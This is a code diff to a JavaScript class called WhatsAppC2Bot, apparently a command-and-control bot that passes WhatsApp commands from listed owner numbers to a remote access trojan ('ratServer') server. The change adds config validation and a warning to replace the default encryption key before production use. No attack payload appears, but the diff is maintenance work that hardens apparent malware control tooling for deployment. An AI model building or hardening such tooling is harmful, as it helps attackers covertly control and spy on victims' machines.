@@ -37,15 +37,45 @@ class WhatsAppC2Bot {
   }
 
   /**
-   * Load configuration
+   * Load configuration with validation
    */
   loadConfig() {
     try {
       const configData = fs.readFileSync('./config.json', 'utf8');
-      return JSON.parse(configData);
+      const config = JSON.parse(configData);
+      
+      // Validate required fields
+      this.validateConfig(config);
+      
+      return config;
     } catch (error) {
       console.error(chalk.red('Failed to load config.json'));
+      console.error(chalk.red(`Error: ${error.message}`));
       process.exit(1);
+    }
+  }
+
+  /**
+   * Validate configuration structure and values
+   */
+  validateConfig(config) {
+    const requiredFields = {
+      'ratServer.host': () => config.ratServer?.host && typeof config.ratServer.host === 'string',
+      'ratServer.port': () => config.ratServer?.port && typeof config.ratServer.port === 'number',
+      'ratServer.encryptionKey': () => config.ratServer?.encryptionKey && typeof config.ratServer.encryptionKey === 'string',
+      'whatsapp.prefix': () => config.whatsapp?.prefix && typeof config.whatsapp.prefix === 'string',
+      'whatsapp.ownerNumbers': () => Array.isArray(config.whatsapp?.ownerNumbers) && config.whatsapp.ownerNumbers.length > 0,
+    };
+
+    for (const [field, validator] of Object.entries(requiredFields)) {
+      if (!validator()) {
+        throw new Error(`Invalid configuration: missing or invalid field '${field}'`);
+      }
+    }
+
+    // Warn about default encryption key
+    if (config.ratServer.encryptionKey === 'YOUR_ENCRYPTION_KEY_HERE') {
+      console.warn(chalk.yellow('⚠ WARNING: Using default encryption key. Update encryptionKey in config.json for production!'));
     }
   }
 
